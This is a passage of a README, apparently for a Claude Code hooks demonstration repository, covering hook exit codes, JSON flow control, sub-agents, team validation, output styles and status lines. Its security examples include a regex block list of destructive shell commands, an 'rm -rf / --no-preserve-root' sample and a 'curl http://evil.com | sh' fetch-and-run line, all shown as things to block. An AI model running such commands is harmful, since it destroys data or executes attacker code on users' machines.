<li><code>anthropic_docs_subagents.md</code> - Sub-agents documentation</li> \n  </ul> </li> \n <li><code>ruff.toml</code> - Ruff linter configuration for Python code quality</li> \n <li><code>ty.toml</code> - Type checker configuration for Python type validation</li> \n</ul> \n<p>Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions.</p> \n<h2>Features Demonstrated</h2> \n<ul> \n <li>Prompt validation and security filtering</li> \n <li>Context injection for enhanced AI responses</li> \n <li>Command logging and auditing</li> \n <li>Automatic transcript conversion</li> \n <li>Permission-based tool access control</li> \n <li>Error handling in hook execution</li> \n</ul> \n<p>Run any Claude Code command to see hooks in action via the <code>logs/</code> files.</p> \n<h2>Hook Error Codes &amp; Flow Control</h2> \n<p>Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output.</p> \n<h3>Exit Code Behavior</h3> \n<p>Hooks communicate status and control flow through exit codes:</p> \n<table> \n <thead> \n  <tr> \n   <th>Exit Code</th> \n   <th>Behavior</th> \n   <th>Description</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><strong>0</strong></td> \n   <td>Success</td> \n   <td>Hook executed successfully. <code>stdout</code> shown to user in transcript mode (Ctrl-R)</td> \n  </tr> \n  <tr> \n   <td><strong>2</strong></td> \n   <td>Blocking Error</td> \n   <td><strong>Critical</strong>: <code>stderr</code> is fed back to Claude automatically. See hook-specific behavior below</td> \n  </tr> \n  <tr> \n   <td><strong>Other</strong></td> \n   <td>Non-blocking Error</td> \n   <td><code>stderr</code> shown to user, execution continues normally</td> \n  </tr> \n </tbody> \n</table> \n<h3>Hook-Specific Flow Control</h3> \n<p>Each hook type has different capabilities for blocking and controlling Claude Code's behavior:</p> \n<h4>UserPromptSubmit Hook - <strong>CAN BLOCK PROMPTS &amp; ADD CONTEXT</strong></h4> \n<ul> \n <li><strong>Primary Control Point</strong>: Intercepts user prompts before Claude processes them</li> \n <li><strong>Exit Code 2 Behavior</strong>: Blocks the prompt entirely, shows error message to user</li> \n <li><strong>Use Cases</strong>: Prompt validation, security filtering, context injection, audit logging</li> \n <li><strong>Example</strong>: Our <code>user_prompt_submit.py</code> logs all prompts and can validate them</li> \n</ul> \n<h4>PreToolUse Hook - <strong>CAN BLOCK TOOL EXECUTION</strong></h4> \n<ul> \n <li><strong>Primary Control Point</strong>: Intercepts tool calls before they execute</li> \n <li><strong>Exit Code 2 Behavior</strong>: Blocks the tool call entirely, shows error message to Claude</li> \n <li><strong>Use Cases</strong>: Security validation, parameter checking, dangerous command prevention</li> \n <li><strong>Example</strong>: Our <code>pre_tool_use.py</code> blocks <code>rm -rf</code> commands with exit code 2</li> \n</ul> \n<pre><code class=\"language-python\"># Block dangerous commands\nif is_dangerous_rm_command(command):\n    print(\"BLOCKED: Dangerous rm command detected\", file=sys.stderr)\n    sys.exit(2)  # Blocks tool call, shows error to Claude\n</code></pre> \n<h4>PostToolUse Hook - <strong>CANNOT BLOCK (Tool Already Executed)</strong></h4> \n<ul> \n <li><strong>Primary Control Point</strong>: Provides feedback after tool completion</li> \n <li><strong>Exit Code 2 Behavior</strong>: Shows error to Claude (tool already ran, cannot be undone)</li> \n <li><strong>Use Cases</strong>: Validation of results, formatting, cleanup, logging</li> \n <li><strong>Limitation</strong>: Cannot prevent tool execution since it fires after completion</li> \n</ul> \n<h4>Notification Hook - <strong>CANNOT BLOCK</strong></h4> \n<ul> \n <li><strong>Primary Control Point</strong>: Handles Claude Code notifications</li> \n <li><strong>Exit Code 2 Behavior</strong>: N/A - shows stderr to user only, no blocking capability</li> \n <li><strong>Use Cases</strong>: Custom notifications, logging, user alerts</li> \n <li><strong>Limitation</strong>: Cannot control Claude Code behavior, purely informational</li> \n</ul> \n<h4>Stop Hook - <strong>CAN BLOCK STOPPING</strong></h4> \n<ul> \n <li><strong>Primary Control Point</strong>: Intercepts when Claude Code tries to finish responding</li> \n <li><strong>Exit Code 2 Behavior</strong>: Blocks stoppage, shows error to Claude (forces continuation)</li> \n <li><strong>Use Cases</strong>: Ensuring tasks complete, validation of final state use this to FORCE CONTINUATION</li> \n <li><strong>Caution</strong>: Can cause infinite loops if not properly controlled</li> \n</ul> \n<h4>SubagentStop Hook - <strong>CAN BLOCK SUBAGENT STOPPING</strong></h4> \n<ul> \n <li><strong>Primary Control Point</strong>: Intercepts when Claude Code subagents try to finish</li> \n <li><strong>Exit Code 2 Behavior</strong>: Blocks subagent stoppage, shows error to subagent</li> \n <li><strong>Use Cases</strong>: Ensuring subagent tasks complete properly</li> \n <li><strong>Example</strong>: Our <code>subagent_stop.py</code> logs events and announces completion</li> \n</ul> \n<h4>PreCompact Hook - <strong>CANNOT BLOCK</strong></h4> \n<ul> \n <li><strong>Primary Control Point</strong>: Fires before compaction operations</li> \n <li><strong>Exit Code 2 Behavior</strong>: N/A - shows stderr to user only, no blocking capability</li> \n <li><strong>Use Cases</strong>: Transcript backup, context preservation, pre-compaction logging</li> \n <li><strong>Example</strong>: Our <code>pre_compact.py</code> creates transcript backups before compaction</li> \n</ul> \n<h4>SessionStart Hook - <strong>CANNOT BLOCK</strong></h4> \n<ul> \n <li><strong>Primary Control Point</strong>: Fires when new sessions start or resume</li> \n <li><strong>Exit Code 2 Behavior</strong>: N/A - shows stderr to user only, no blocking capability</li> \n <li><strong>Use Cases</strong>: Loading development context, session initialization, environment setup</li> \n <li><strong>Example</strong>: Our <code>session_start.py</code> loads git status, recent issues, and context files</li> \n</ul> \n<h3>Advanced JSON Output Control</h3> \n<p>Beyond simple exit codes, hooks can return structured JSON for sophisticated control:</p> \n<h4>Common JSON Fields (All Hook Types)</h4> \n<pre><code class=\"language-json\">{\n  \"continue\": true,           // Whether Claude should continue (default: true)\n  \"stopReason\": \"string\",     // Message when continue=false (shown to user)\n  \"suppressOutput\": true      // Hide stdout from transcript (default: false)\n}\n</code></pre> \n<h4>PreToolUse Decision Control</h4> \n<pre><code class=\"language-json\">{\n  \"decision\": \"approve\" | \"block\" | undefined,\n  \"reason\": \"Explanation for decision\"\n}\n</code></pre> \n<ul> \n <li><strong>\"approve\"</strong>: Bypasses permission system, <code>reason</code> shown to user</li> \n <li><strong>\"block\"</strong>: Prevents tool execution, <code>reason</code> shown to Claude</li> \n <li><strong>undefined</strong>: Normal permission flow, <code>reason</code> ignored</li> \n</ul> \n<h4>PostToolUse Decision Control</h4> \n<pre><code class=\"language-json\">{\n  \"decision\": \"block\" | undefined,\n  \"reason\": \"Explanation for decision\"\n}\n</code></pre> \n<ul> \n <li><strong>\"block\"</strong>: Automatically prompts Claude with <code>reason</code></li> \n <li><strong>undefined</strong>: No action, <code>reason</code> ignored</li> \n</ul> \n<h4>Stop Decision Control</h4> \n<pre><code class=\"language-json\">{\n  \"decision\": \"block\" | undefined,\n  \"reason\": \"Must be provided when blocking Claude from stopping\"\n}\n</code></pre> \n<ul> \n <li><strong>\"block\"</strong>: Prevents Claude from stopping, <code>reason</code> tells Claude how to proceed</li> \n <li><strong>undefined</strong>: Allows normal stopping, <code>reason</code> ignored</li> \n</ul> \n<h3>Flow Control Priority</h3> \n<p>When multiple control mechanisms are used, they follow this priority:</p> \n<ol> \n <li><strong><code>\"continue\": false</code></strong> - Takes precedence over all other controls</li> \n <li><strong><code>\"decision\": \"block\"</code></strong> - Hook-specific blocking behavior</li> \n <li><strong>Exit Code 2</strong> - Simple blocking via stderr</li> \n <li><strong>Other Exit Codes</strong> - Non-blocking errors</li> \n</ol> \n<h3>Security Implementation Examples</h3> \n<h4>1. Command Validation (PreToolUse)</h4> \n<pre><code class=\"language-python\"># Block dangerous patterns\ndangerous_patterns = [\n    r'rm\\s+.*-[rf]',           # rm -rf variants\n    r'sudo\\s+rm',              # sudo rm commands\n    r'chmod\\s+777',            # Dangerous permissions\n    r'&gt;\\s*/etc/',              # Writing to system directories\n]\n\nfor pattern in dangerous_patterns:\n    if re.search(pattern, command, re.IGNORECASE):\n        print(f\"BLOCKED: {pattern} detected\", file=sys.stderr)\n        sys.exit(2)\n</code></pre> \n<h4>2. Result Validation (PostToolUse)</h4> \n<pre><code class=\"language-python\"># Validate file operations\nif tool_name == \"Write\" and not tool_response.get(\"success\"):\n    output = {\n        \"decision\": \"block\",\n        \"reason\": \"File write operation failed, please check permissions and retry\"\n    }\n    print(json.dumps(output))\n    sys.exit(0)\n</code></pre> \n<h4>3. Completion Validation (Stop Hook)</h4> \n<pre><code class=\"language-python\"># Ensure critical tasks are complete\nif not all_tests_passed():\n    output = {\n        \"decision\": \"block\",\n        \"reason\": \"Tests are failing. Please fix failing tests before completing.\"\n    }\n    print(json.dumps(output))\n    sys.exit(0)\n</code></pre> \n<h3>Hook Execution Environment</h3> \n<ul> \n <li><strong>Timeout</strong>: 60-second execution limit per hook</li> \n <li><strong>Parallelization</strong>: All matching hooks run in parallel</li> \n <li><strong>Environment</strong>: Inherits Claude Code's environment variables</li> \n <li><strong>Working Directory</strong>: Runs in current project directory</li> \n <li><strong>Input</strong>: JSON via stdin with session and tool data</li> \n <li><strong>Output</strong>: Processed via stdout/stderr with exit codes</li> \n</ul> \n<h2>UserPromptSubmit Hook Deep Dive</h2> \n<p>The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it.</p> \n<h3>What It Can Do</h3> \n<ol> \n <li><strong>Log prompts</strong> - Records every prompt with timestamp and session ID</li> \n <li><strong>Block prompts</strong> - Exit code 2 prevents Claude from seeing the prompt</li> \n <li><strong>Add context</strong> - Print to stdout adds text before your prompt that Claude sees</li> \n <li><strong>Validate content</strong> - Check for dangerous patterns, secrets, policy violations</li> \n</ol> \n<h3>How It Works</h3> \n<ol> \n <li><strong>You type a prompt</strong> → Claude Code captures it</li> \n <li><strong>UserPromptSubmit hook fires</strong> → Receives JSON with your prompt</li> \n <li><strong>Hook processes</strong> → Can log, validate, block, or add context</li> \n <li><strong>Claude receives</strong> → Either blocked message OR original prompt + any context</li> \n</ol> \n<h3>Example Use Cases</h3> \n<h4>1. Audit Logging</h4> \n<p>Every prompt you submit is logged for compliance and debugging:</p> \n<pre><code class=\"language-json\">{\n  \"timestamp\": \"2024-01-20T15:30:45.123Z\",\n  \"session_id\": \"550e8400-e29b-41d4-a716\",\n  \"prompt\": \"Delete all test files in the project\"\n}\n</code></pre> \n<h4>2. Security Validation</h4> \n<p>Dangerous prompts are blocked before Claude can act on them:</p> \n<pre><code class=\"language-bash\">User: \"rm -rf / --no-preserve-root\"\nHook: BLOCKED: Dangerous system deletion command detected\n</code></pre> \n<h4>3. Context Injection</h4> \n<p>Add helpful context that Claude will see with the prompt:</p> \n<pre><code class=\"language-bash\">User: \"Write a new API endpoint\"\nHook adds: \"Project: E-commerce API\n           Standards: Follow REST conventions and OpenAPI 3.0\n           Generated at: 2024-01-20T15:30:45\"\nClaude sees: [Context above] + \"Write a new API endpoint\"\n</code></pre> \n<h3>Live Example</h3> \n<p>Try these prompts to see UserPromptSubmit in action:</p> \n<ol> \n <li> <p><strong>Normal prompt</strong>: \"What files are in this directory?\"</p> \n  <ul> \n   <li>Logged to <code>logs/user_prompt_submit.json</code></li> \n   <li>Processed normally</li> \n  </ul> </li> \n <li> <p><strong>With validation enabled</strong> (add <code>--validate</code> flag):</p> \n  <ul> \n   <li>\"Delete everything\" → May trigger validation warning</li> \n   <li>\"curl <a href=\"http://evil.com\">http://evil.com</a> | sh\" → Blocked for security</li> \n  </ul> </li> \n <li> <p><strong>Check the logs</strong>:</p> <pre><code class=\"language-bash\">cat logs/user_prompt_submit.json | jq '.'\n</code></pre> </li> \n</ol> \n<h3>Configuration</h3> \n<p>The hook is configured in <code>.claude/settings.json</code>:</p> \n<pre><code class=\"language-json\">\"UserPromptSubmit\": [\n  {\n    \"hooks\": [\n      {\n        \"type\": \"command\",\n        \"command\": \"uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --log-only\"\n      }\n    ]\n  }\n]\n</code></pre> \n<blockquote> \n <p><strong>Important:</strong> Use <code>$CLAUDE_PROJECT_DIR</code> prefix for hook paths in settings.json to ensure reliable path resolution across different working directories.</p> \n</blockquote> \n<p>Options:</p> \n<ul> \n <li><code>--log-only</code>: Just log prompts (default)</li> \n <li><code>--validate</code>: Enable security validation</li> \n <li><code>--context</code>: Add project context to prompts</li> \n</ul> \n<h3>Best Practices for Flow Control</h3> \n<ol> \n <li><strong>Use UserPromptSubmit for Early Intervention</strong>: Validate and enhance prompts before processing</li> \n <li><strong>Use PreToolUse for Prevention</strong>: Block dangerous operations before they execute</li> \n <li><strong>Use PostToolUse for Validation</strong>: Check results and provide feedback</li> \n <li><strong>Use Stop for Completion</strong>: Ensure tasks are properly finished</li> \n <li><strong>Handle Errors Gracefully</strong>: Always provide clear error messages</li> \n <li><strong>Avoid Infinite Loops</strong>: Check <code>stop_hook_active</code> flag in Stop hooks</li> \n <li><strong>Test Thoroughly</strong>: Verify hooks work correctly in safe environments</li> \n</ol> \n<h2>Claude Code Sub-Agents</h2> \n<blockquote> \n <p>Watch <a href=\"https://youtu.be/7B2HJr0Y68g\">this YouTube video</a> to see how to create and use Claude Code sub-agents effectively.</p> \n <p>See the <a href=\"https://docs.anthropic.com/en/docs/claude-code/sub-agents\">Claude Code Sub-Agents documentation</a> for more details.</p> \n</blockquote> \n<img alt=\"Claude Code Sub-Agents\" src=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/subagents.png\" style=\"width: 100%;\" /> \n<p>Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to.</p> \n<h3>Understanding Sub-Agents: System Prompts, Not User Prompts</h3> \n<p><strong>Critical Concept</strong>: The content in agent files (<code>.claude/agents/*.md</code>) are <strong>system prompts</strong> that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents.</p> \n<p><strong>Information Flow</strong>:</p> \n<pre><code>You (User) → Primary Agent → Sub-Agent → Primary Agent → You (User)\n</code></pre> \n<img alt=\"Sub-Agent Information Flow\" src=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/SubAgentFlow.gif\" style=\"width: 100%;\" /> \n<ol> \n <li><strong>You</strong> make a request to Claude Code (primary agent)</li> \n <li><strong>Primary Agent</strong> analyzes your request and delegates to appropriate sub-agent</li> \n <li><strong>Sub-Agent</strong> executes task using its system prompt instructions</li> \n <li><strong>Sub-Agent</strong> reports results back to primary agent</li> \n <li><strong>Primary Agent</strong> synthesizes and presents results to you</li> \n</ol> \n<p><strong>Key Points</strong>:</p> \n<ul> \n <li>Sub-agents NEVER communicate directly with you</li> \n <li>Sub-agents start fresh with no conversation history</li> \n <li>Sub-agents respond to the primary agent's prompt, not yours</li> \n <li>The <code>description</code> field tells the primary agent WHEN to use the sub-agent</li> \n</ul> \n<h3>Agent Storage &amp; Organization</h3> \n<p>This repository demonstrates various agent configurations:</p> \n<p><strong>Project Agents</strong> (<code>.claude/agents/</code>):</p> \n<pre><code>.claude/agents/\n├── crypto/                    # Cryptocurrency analysis agents\n│   ├── crypto-coin-analyzer-haiku.md\n│   ├── crypto-coin-analyzer-opus.md\n│   ├── crypto-coin-analyzer-sonnet.md\n│   ├── crypto-investment-plays-*.md\n│   ├── crypto-market-agent-*.md\n│   ├── crypto-movers-haiku.md\n│   └── macro-crypto-correlation-scanner-*.md\n├── hello-world-agent.md       # Simple greeting agent\n├── llm-ai-agents-and-eng-research.md  # AI research specialist\n├── meta-agent.md              # Agent that creates agents\n└── work-completion-summary.md # Audio summary generator\n</code></pre> \n<p><strong>Storage Hierarchy</strong>:</p> \n<ul> \n <li><strong>Project agents</strong>: <code>.claude/agents/</code> (higher priority, project-specific)</li> \n <li><strong>User agents</strong>: <code>~/.claude/agents/</code> (lower priority, available across all projects)</li> \n <li><strong>Format</strong>: Markdown files with YAML frontmatter</li> \n</ul> \n<p><strong>Agent File Structure:</strong></p> \n<pre><code class=\"language-yaml\">---\nname: agent-name\ndescription: When to use this agent (critical for automatic delegation)\ntools: Tool1, Tool2, Tool3  # Optional - inherits all tools if omitted\ncolor: Cyan  # Visual identifier in terminal\nmodel: opus # Optional - haiku | sonnet | opus - defaults to sonnet\n---\n\n# Purpose\nYou are a [role definition]. \n\n## Instructions\n1. Step-by-step instructions\n2. What the agent should do\n3. How to report results\n\n## Report/Response Format\nSpecify how the agent should communicate results back to the primary agent.\n</code></pre> \n<p>Sub-agents enable:</p> \n<ul> \n <li><strong>Task specialization</strong> - Code reviewers, debuggers, test runners</li> \n <li><strong>Context preservation</strong> - Each agent operates independently</li> \n <li><strong>Tool restrictions</strong> - Grant only necessary permissions</li> \n <li><strong>Automatic delegation</strong> - Claude proactively uses the right agent</li> \n</ul> \n<h3>Key Engineering Insights</h3> \n<p><strong>Two Critical Mistakes to Avoid:</strong></p> \n<ol> \n <li> <p><strong>Misunderstanding the System Prompt</strong> - What you write in agent files is the <em>system prompt</em>, not a user prompt. This changes how you structure instructions and what information is available to the agent.</p> </li> \n <li> <p><strong>Ignoring Information Flow</strong> - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you.</p> </li> \n</ol> \n<p><strong>Best Practices:</strong></p> \n<ul> \n <li>Use the <code>description</code> field to tell your primary agent <em>when</em> and <em>how</em> to prompt sub-agents</li> \n <li>Include phrases like \"use PROACTIVELY\" or trigger words (e.g., \"if they say TTS\") in descriptions</li> \n <li>Remember sub-agents start fresh with no context - be explicit about what they need to know</li> \n <li>Follow Problem → Solution → Technology approach when building agents</li> \n</ul> \n<h3>Complex Workflows &amp; Agent Chaining</h3> \n<p>Claude Code can intelligently chain multiple sub-agents together for complex tasks:</p> \n<img alt=\"Sub-Agent Chaining\" src=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/SubAgentChain.gif\" style=\"width: 100%;\" /> \n<p>For example:</p> \n<ul> \n <li>\"First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities\"</li> \n <li>\"Use the debugger agent to fix errors, then have the code-reviewer check the changes\"</li> \n <li>\"Generate a new agent with meta-agent, then test it on a specific task\"</li> \n</ul> \n<p>This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns.</p> \n<h3>The Meta-Agent</h3> \n<p>The meta-agent (<code>.claude/agents/meta-agent.md</code>) is a specialized sub-agent that generates new sub-agents from descriptions. It's the \"agent that builds agents\" - a critical tool for scaling your agent development velocity.</p> \n<p><strong>Why Meta-Agent Matters:</strong></p> \n<ul> \n <li><strong>Rapid Agent Creation</strong> - Build dozens of specialized agents in minutes instead of hours</li> \n <li><strong>Consistent Structure</strong> - Ensures all agents follow best practices and proper formatting</li> \n <li><strong>Live Documentation</strong> - Pulls latest Claude Code docs to stay current with features</li> \n <li><strong>Intelligent Tool Selection</strong> - Automatically determines minimal tool requirements</li> \n</ul> \n<p><strong>Using the Meta-Agent:</strong></p> \n<pre><code class=\"language-bash\"># Simply describe what you want\n\"Build a new sub-agent that runs tests and fixes failures\"\n\n# Claude Code will automatically delegate to meta-agent\n# which will create a properly formatted agent file\n</code></pre> \n<p>The meta-agent follows the principle: \"Figure out how to scale it up. Build the thing that builds the thing.\" This compound effect accelerates your engineering capabilities exponentially.</p> \n<h2>Team-Based Validation System</h2> \n<blockquote> \n <p><strong>Watch the walkthrough:</strong> See agent teams and the <code>/plan_w_team</code> workflow in action at <a href=\"https://youtu.be/4_2j5wgt_ds\">https://youtu.be/4_2j5wgt_ds</a></p> \n</blockquote> \n<img alt=\"Claude Code Task System\" src=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/cctask.png\" style=\"width: 100%;\" /> \n<p>This repository includes a powerful build/validate workflow pattern using the Claude Code task system to orchestrate specialized agent teams.</p> \n<h3>The <code>/plan_w_team</code> Meta Prompt</h3> \n<p>The <code>/plan_w_team</code> command (<code>.claude/commands/plan_w_team.md</code>) is not an ordinary prompt—it has three powerful components:</p> \n<h4>1. Self-Validating</h4> \n<p>The prompt includes embedded hooks in its front matter that validate its own output:</p> \n<pre><code class=\"language-yaml\">hooks:\n  stop:\n    - command: \"uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_new_file.py specs/*.md\"\n    - command: \"uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_file_contains.py\"\n</code></pre> \n<p>After the planning agent finishes, these validators ensure:</p> \n<ul> \n <li>A spec file was created in the correct directory</li> \n <li>The file contains required sections (team orchestration, step-by-step tasks, etc.)</li> \n</ul> \n<p>If validation fails, the agent receives feedback and continues working until the output meets criteria.</p> \n<h4>2. Agent Orchestration</h4> \n<p>The prompt leverages Claude Code's task system to build and coordinate agent teams:</p> \n<table> \n <thead> \n  <tr> \n   <th>Task Tool</th> \n   <th>Purpose</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><code>TaskCreate</code></td> \n   <td>Create new tasks with owners, descriptions, dependencies</td> \n  </tr> \n  <tr> \n   <td><code>TaskUpdate</code></td> \n   <td>Update status, add blockers, communicate completion</td> \n  </tr> \n  <tr> \n   <td><code>TaskList</code></td> \n   <td>View all tasks and their current state</td> \n  </tr> \n  <tr> \n   <td><code>TaskGet</code></td> \n   <td>Retrieve full task details</td> \n  </tr> \n </tbody> \n</table> \n<p><strong>How it works:</strong></p> \n<ol> \n <li>Primary agent creates a task list with specific owners (builder/validator)</li> \n <li>Tasks can run in parallel or have dependency blockers</li> \n <li>Subagents complete work and ping back to the primary agent</li> \n <li>Primary agent reacts in real-time as work completes</li> \n <li>Blocked tasks automatically unblock when dependencies finish</li> \n</ol> \n<p>This enables longer-running threads of work because the task system handles coordination—no bash sleep loops needed.</p> \n<h4>3. Templating</h4> \n<p><code>/plan_w_team</code> is a <strong>template meta prompt</strong>—a prompt that generates prompts in a specific, vetted format:</p> \n<pre><code class=\"language-markdown\">## Plan Format (embedded in the meta prompt)\n\n### {{PLAN_NAME}}\n**Task:** {{TASK_DESCRIPTION}}\n**Objective:** {{OBJECTIVE}}\n\n### Team Orchestration\n{{TEAM_MEMBERS}}\n\n### Step-by-Step Tasks\n{{TASKS}}\n</code></pre> \n<p>The generated plan follows your engineering patterns exactly. This is the difference between agentic engineering and \"vibe coding\"—you know the outcome your agent will generate because you've templated the format.</p> \n<h3>Team Agents</h3> \n<table> \n <thead> \n  <tr> \n   <th>Agent</th> \n   <th>File</th> \n   <th>Tools</th> \n   <th>Self-Validation</th> \n   <th>Purpose</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><strong>Builder</strong></td> \n   <td><code>team/builder.md</code></td> \n   <td>All tools</td> \n   <td>Ruff + Ty on .py files</td> \n   <td>Execute implementation tasks, build the thing</td> \n  </tr> \n  <tr> \n   <td><strong>Validator</strong></td> \n   <td><code>team/validator.md</code></td> \n   <td>Read-only (no Write/Edit)</td> \n   <td>None</td> \n   <td>Verify builder's work meets acceptance criteria</td> \n  </tr> \n </tbody> \n</table> \n<p>This two-agent pairing increases compute to increase trust that work was delivered correctly.</p> \n<h3>Code Quality Validators</h3> \n<p>PostToolUse validators automatically enforce code quality:</p> \n<table> \n <thead> \n  <tr> \n   <th>Validator</th> \n   <th>File</th> \n   <th>Trigger</th> \n   <th>Action</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><strong>Ruff</strong></td> \n   <td><code>ruff_validator.py</code></td> \n   <td>Write/Edit on .py files</td> \n   <td>Blocks on lint errors</td> \n  </tr> \n  <tr> \n   <td><strong>Ty</strong></td> \n   <td><code>ty_validator.py</code></td> \n   <td>Write/Edit on .py files</td> \n   <td>Blocks on type errors</td> \n  </tr> \n </tbody> \n</table> \n<h3>Workflow Example</h3> \n<pre><code class=\"language-bash\"># 1. Create a plan with team orchestration\n/plan_w_team\n\n# User prompt: \"Update the hooks documentation and add missing status lines\"\n# Orchestration prompt: \"Create groups of agents for each hook, one builder and one validator\"\n\n# 2. Plan is generated with:\n#    - Team members (session_end_builder, session_end_validator, etc.)\n#    - Step-by-step tasks with dependencies\n#    - Validation commands\n\n# 3. Execute the plan\n/build\n\n# 4. Watch agents work in parallel:\n#    - Builders implement features\n#    - Validators verify completion\n#    - Task system coordinates everything\n</code></pre> \n<h3>Configuration</h3> \n<ul> \n <li><code>ruff.toml</code> - Ruff linter rules</li> \n <li><code>ty.toml</code> - Type checker settings</li> \n <li><code>.claude/agents/team/</code> - Team agent definitions</li> \n</ul> \n<h2>Output Styles Collection</h2> \n<blockquote> \n <p><strong>Watch the walkthrough:</strong> See these features in action at <a href=\"https://youtu.be/mJhsWrEv-Go\">https://youtu.be/mJhsWrEv-Go</a></p> \n</blockquote> \n<img alt=\"GenUI Output Style\" src=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/genui.png\" style=\"width: 100%;\" /> \n<p>This project includes a comprehensive collection of custom output styles (<code>.claude/output-styles/</code>) that transform how Claude Code communicates responses. See the <a href=\"https://docs.anthropic.com/en/docs/claude-code/output-styles\">official documentation</a> for complete details on how output styles work.</p> \n<table> \n <thead> \n  <tr> \n   <th>Style</th> \n   <th>Description</th> \n   <th>Best For</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><strong>genui</strong> ⭐</td> \n   <td><strong>Generates beautiful HTML with embedded styling</strong></td> \n   <td><strong>Interactive visual outputs, instant browser preview</strong></td> \n  </tr> \n  <tr> \n   <td><strong>table-based</strong></td> \n   <td>Organizes all information in markdown tables</td> \n   <td>Comparisons, structured data, status reports</td> \n  </tr> \n  <tr> \n   <td><strong>yaml-structured</strong></td> \n   <td>Formats responses as YAML configuration</td> \n   <td>Settings, hierarchical data, API responses</td> \n  </tr> \n  <tr> \n   <td><strong>bullet-points</strong></td> \n   <td>Clean nested lists with dashes and numbers</td> \n   <td>Action items, documentation, task tracking</td> \n  </tr> \n  <tr> \n   <td><strong>ultra-concise</strong></td> \n   <td>Minimal words, maximum speed</td> \n   <td>Experienced devs, rapid prototyping</td> \n  </tr> \n  <tr> \n   <td><strong>html-structured</strong></td> \n   <td>Semantic HTML5 with data attributes</td> \n   <td>Web documentation, rich formatting</td> \n  </tr> \n  <tr> \n   <td><strong>markdown-focused</strong></td> \n   <td>Leverages all markdown features optimally</td> \n   <td>Complex documentation, mixed content</td> \n  </tr> \n  <tr> \n   <td><strong>tts-summary</strong></td> \n   <td>Announces task completion via ElevenLabs TTS</td> \n   <td>Audio feedback, accessibility</td> \n  </tr> \n </tbody> \n</table> \n<p><strong>Usage:</strong> Run <code>/output-style [name]</code> to activate any style (e.g., <code>/output-style table-based</code>)</p> \n<p><strong>Location:</strong></p> \n<ul> \n <li>Project styles: <code>.claude/output-styles/*.md</code> (this repo)</li> \n <li>User styles: <code>~/.claude/output-styles/*.md</code> (global)</li> \n</ul> \n<p>Output styles modify Claude's system prompt to change response formatting without affecting core functionality. Each style is a markdown file with YAML frontmatter defining the name, description, and formatting instructions.</p> \n<h2>Custom Status Lines</h2> \n<blockquote> \n <p><strong>Watch the walkthrough:</strong> See these features in action at <a href=\"https://youtu.be/mJhsWrEv-Go\">https://youtu.be/mJhsWrEv-Go</a></p> \n</blockquote> \n<p>This project includes enhanced Claude Code status lines that display real-time conversation context. Status lines provide dynamic information at the bottom of your terminal during Claude Code sessions. See the <a href=\"https://docs.anthropic.com/en/docs/claude-code/statusline\">official documentation</a> for complete details.</p> \n<h3>Available Status Lines</h3> \n<p><strong>Location:</strong> <code>.claude/status_lines/</code></p> \n<table> \n <thead> \n  <tr> \n   <th>Version</th> \n   <th>File</th> \n   <th>Description</th> \n   <th>Features</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><strong>v1</strong></td> \n   <td><code>status_line.py</code></td> \n   <td>Basic MVP</td> \n   <td>Git branch, directory, model info</td> \n  </tr> \n  <tr> \n   <td><strong>v2</strong></td> \n   <td><code>status_line_v2.py</code></td> \n   <td>Smart prompts</td> \n   <td>Latest prompt (250 chars), color-coded by task type</td> \n  </tr> \n  <tr> \n   <td><strong>v3</strong></td> \n   <td><code>status_line_v3.py</code></td> \n   <td>Agent sessions</td> \n   <td>Agent name, model, last 3 prompts</td> \n  </tr> \n  <tr> \n   <td><strong>v4</strong></td> \n   <td><code>status_line_v4.py</code></td> \n   <td>Extended metadata</td> \n   <td>Agent name, model, latest prompt, custom key-value pairs</td> \n  </tr> \n  <tr> \n   <td><strong>v5</strong></td> \n   <td><code>status_line_v5.py</code></td> \n   <td>Cost tracking</td> \n   <td>Model, cost ($), line changes (+/-), session duration</td> \n  </tr> \n  <tr> \n   <td><strong>v6</strong></td> \n   <td><code>status_line_v6.py</code></td> \n   <td>Context window</td> \n   <td>Visual usage bar, percentage, tokens remaining</td> \n  </tr> \n  <tr> \n   <td><strong>v7</strong></td> \n   <td><code>status_line_v7.py</code></td> \n   <td>Duration timer</td> \n   <td>Session time, start time, optional end time</td> \n  </tr> \n  <tr> \n   <td><strong>v8</strong></td> \n   <td><code>status_line_v8.py</code></td> \n   <td>Token/cache stats</td> \n   <td>Input/output tokens, cache creation/read stats</td> \n  </tr> \n  <tr> \n   <td><strong>v9</strong></td> \n   <td><code>status_line_v9.py</code></td> \n   <td>Powerline minimal</td> \n   <td>Stylized segments with powerline separators, git branch, % used</td> \n  </tr> \n </tbody> \n</table> \n<h3>Session Management</h3> \n<p>Status lines leverage session data stored in <code>.claude/data/sessions/&lt;session_id&gt;.json</code>:</p> \n<pre><code class=\"language-json\">{\n  \"session_id\": \"unique-session-id\",\n  \"prompts\": [\"first prompt\", \"second prompt\", ...],\n  \"agent_name\": \"Phoenix\",  // Auto-generated unique name\n  \"extras\": {              // v4: Custom metadata (optional)\n    \"project\": \"myapp\",\n    \"status\": 